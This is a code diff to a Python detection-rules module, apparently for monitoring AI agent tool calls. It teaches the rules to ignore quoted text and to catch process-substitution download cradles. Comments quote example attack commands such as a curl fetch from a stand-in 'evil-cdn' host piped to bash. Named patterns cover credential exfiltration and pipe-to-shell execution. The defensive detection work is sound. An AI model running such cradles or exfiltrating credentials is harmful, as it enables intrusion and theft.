@@ -33,6 +33,8 @@ from .traits import (
     GIT_EXFIL as _GIT_EXFIL,
     LOOPBACK_IP as _LOOPBACK_IP,
     PIPE_TO_SHELL as _PIPE_TO_SHELL,
+    PROC_SUBST_EXEC as _PROC_SUBST_EXEC,
+    mask_literals as _mask_literals,
     pipes_only_loopback as _pipes_only_loopback,
     PR_COMMIT_COMMAND as _PR_COMMIT_COMMAND,
     PR_DESC_COMMAND as _PR_DESC_COMMAND,
@@ -97,6 +99,24 @@ def _tool_qualified(event: dict[str, Any]) -> str:
 def _command(event: dict[str, Any]) -> str:
     tool = event.get("tool")
     return str(tool.get("command") or "") if isinstance(tool, dict) else ""
+
+
+def _command_words(event: dict[str, Any]) -> str:
+    """The command with quoted content and heredoc bodies blanked.
+
+    Use this for anything matching a *command word* -- a verb, a flag, an
+    operator. `curl`, `| bash`, `-EncodedCommand`, `gh pr merge`. A command word
+    inside quotes is not a command; it is an argument to `echo`.
+
+    `classify_command` learned this and these rules did not, which left the fix
+    half-applied: the hook stopped labelling `echo 'curl x | bash' >> notes.md`
+    as a cradle, and then the rules read `tool.command` directly and fired
+    anyway. Two code paths answering one question, again.
+
+    Raw `_command` is still right for extracting URLs and IPs, which are
+    arguments and are routinely quoted.
+    """
+    return _mask_literals(_command(event))
 
 
 def _input_hash(event: dict[str, Any]) -> str:
@@ -246,15 +266,33 @@ def _has_trait(event: dict[str, Any], name: str) -> bool:
 
 
 def _is_credential_access(event: dict[str, Any]) -> bool:
-    return _technique_id(event).startswith("T1552")
+    """Either classifier saying so is enough.
+
+    This used to read the MITRE tag alone, which quietly made the mapper the
+    only opinion that counted. When the mapper was wrong -- a bare ".env"
+    substring matching a Python module path -- it manufactured the credential
+    half of two critical findings while `classify_command` reported no traits at
+    all, and nothing in the system could notice the two disagreed (#40).
+
+    Reading both is not belt and braces. The trait is computed in the hook where
+    the plaintext still exists, and the tag can be recomputed later from
+    whatever evidence survived redaction; an event that kept only one of them is
+    normal rather than suspicious.
+    """
+    return _technique_id(event).startswith("T1552") or _has_trait(
+        event, "credential_access"
+    ) or _has_trait(event, "private_key")
 
 
 def _is_staging_fetch(event: dict[str, Any]) -> bool:
     cmd = _command(event)
     if cmd:
+        # Host from the raw text (a URL is an argument and is often quoted),
+        # fetch verb from the masked text (a verb in quotes is not a verb).
         if not _STAGING_HOST.search(cmd):
             return False
-        return bool(_STAGING_FETCH.search(cmd) or _DOWNLOAD_EXEC.search(cmd))
+        words = _command_words(event)
+        return bool(_STAGING_FETCH.search(words) or _DOWNLOAD_EXEC.search(words))
     return _has_trait(event, "staging_fetch")
 
 
@@ -264,11 +302,12 @@ def _is_risky_exec_after_staging(event: dict[str, Any]) -> bool:
     cmd = _command(event)
     if not cmd:
         return _has_trait(event, "risky_exec")
-    if _BENIGN_AFTER_STAGING.search(cmd):
+    words = _command_words(event)
+    if _BENIGN_AFTER_STAGING.search(words):
         return False
-    if _PIPE_TO_SHELL.search(cmd):
+    if _PIPE_TO_SHELL.search(words) or _PROC_SUBST_EXEC.search(words):
         return True
-    return bool(_RISKY_EXEC_AFTER_STAGING.search(cmd))
+    return bool(_RISKY_EXEC_AFTER_STAGING.search(words))
 
 
 def rule_credential_exfil(events: list[dict[str, Any]]) -> list[Detection]:
@@ -278,7 +317,7 @@ def rule_credential_exfil(events: list[dict[str, Any]]) -> list[Detection]:
     exactly the data a SOC cares about, and no single event looks like an alert.
     """
     cred_idx = next(
-        (i for i, e in enumerate(events) if _technique_id(e).startswith("T1552")),
+        (i for i, e in enumerate(events) if _is_credential_access(e)),
         None,
     )
     if cred_idx is None:
@@ -480,15 +519,21 @@ def rule_encoded_command_download(events: list[dict[str, Any]]) -> list[Detectio
     for event in events:
         cmd = _command(event)
         if cmd:
+            words = _command_words(event)
+            # The IP is an argument and may be quoted; the fetch verb may not.
             remote_ips = [ip for ip in _RAW_IP_URL.findall(cmd) if not _LOOPBACK_IP.match(ip)]
-            raw_ip_fetch = bool(remote_ips and _DOWNLOAD_EXEC.search(cmd))
+            raw_ip_fetch = bool(remote_ips and _DOWNLOAD_EXEC.search(words))
             # Piping a fetch into an interpreter is a cradle whatever the host is.
             # Requiring a bare IP let `curl https://evil-cdn.example.com/x.sh | bash`
             # straight through, which is what a real attacker actually uses.
-            piped_any = bool(_PIPE_TO_SHELL.search(cmd))
+            # Process substitution is the same cradle without a pipe. The
+            # trait classifier learned `bash <(curl ...)`; this branch reads the
+            # command text directly and would have kept missing it, which is the
+            # duplicate-classifier problem one layer down from #40.
+            piped_any = bool(_PIPE_TO_SHELL.search(words) or _PROC_SUBST_EXEC.search(words))
             piped_local = piped_any and _pipes_only_loopback(cmd)
             piped = piped_any and not piped_local
-            encoded = bool(_ENCODED_CMD.search(cmd))
+            encoded = bool(_ENCODED_CMD.search(words))
         else:
             # Default privacy config: no command text — match hook-side labels.
             raw_ip_fetch = _has_trait(event, "raw_ip_fetch")
@@ -772,7 +817,7 @@ def rule_pr_merged_without_review(events: list[dict[str, Any]]) -> list[Detectio
     for event in events:
         if _action_type(event) != "tool_called":
             continue
-        method, cmd = _method(event), _command(event)
+        method, cmd = _method(event), _command_words(event)
 
         if method in _PR_DESC_METHODS or _PR_DESC_COMMAND.search(cmd) or _has_trait(event, "pr_desc"):
             saw_pr = True
